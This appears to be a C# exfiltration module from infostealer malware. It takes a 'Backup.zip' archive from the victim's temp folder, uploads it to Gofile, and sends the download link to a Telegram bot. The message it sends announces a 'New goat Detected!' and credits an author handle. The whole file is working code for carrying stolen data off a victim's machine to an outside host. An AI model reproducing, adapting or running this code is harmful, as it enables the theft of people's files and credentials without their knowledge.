using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

public class Sender
{
    private readonly HttpClient _httpClient;
    private string _botToken;
    private long _chatId;

    public Sender()
    {
        _httpClient = new HttpClient();
    }

    public void SetTelegramCredentials(string botToken, long chatId)
    {
        _botToken = botToken;
        _chatId = chatId;
    }

    public async Task SendMessageAsync(string message)
    {
        try
        {
            if (string.IsNullOrEmpty(_botToken) || _chatId == 0)
            {
                Console.WriteLine("Telegram credentials not set. Call SetTelegramCredentials method first.");
                return;
            }

            string url = $"https://api.telegram.org/bot{_botToken}/sendMessage";
            var content = new StringContent($"chat_id={_chatId}&text={message}", Encoding.UTF8, "application/x-www-form-urlencoded");
            var response = await _httpClient.PostAsync(url, content);

            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine(responseBody); // Optional: Output response from Telegram API
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred while sending message: {ex.Message}");
        }
    }

    public async Task<string> UploadToGofileAsync(string filePath)
    {
        try
        {
            
            var serverResponse = await _httpClient.GetStringAsync("https://api.gofile.io/getServer");
            var serverData = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(serverResponse);
            string server = serverData.data.server;

            
            using (var fileStream = new FileStream(filePath, FileMode.Open))
            {
                var formData = new MultipartFormDataContent();
                formData.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                var uploadResponse = await _httpClient.PostAsync($"https://{server}.gofile.io/uploadFile", formData);
                uploadResponse.EnsureSuccessStatusCode();

                var uploadResult = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(await uploadResponse.Content.ReadAsStringAsync());
                string downloadPage = uploadResult.data.downloadPage;

                return downloadPage;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred while uploading to Gofile: {ex.Message}");
            return null;
        }
    }

    public async Task UploadBackupAndSendLinkAsync()
    {
        string tempFolderPath = Path.GetTempPath();
        string backupFilePath = Path.Combine(tempFolderPath, "Backup.zip");

        if (!File.Exists(backupFilePath))
        {
            Console.WriteLine("Backup file not found in temp folder.");
            return;
        }

        string goFileLink = await UploadToGofileAsync(backupFilePath);
        if (goFileLink != null)
        {
            string message = $"New goat Detected!\nProgrammed By -> @Zelroth\nDownload link: {goFileLink}";
            await SendMessageAsync(message);
        }
    }
}
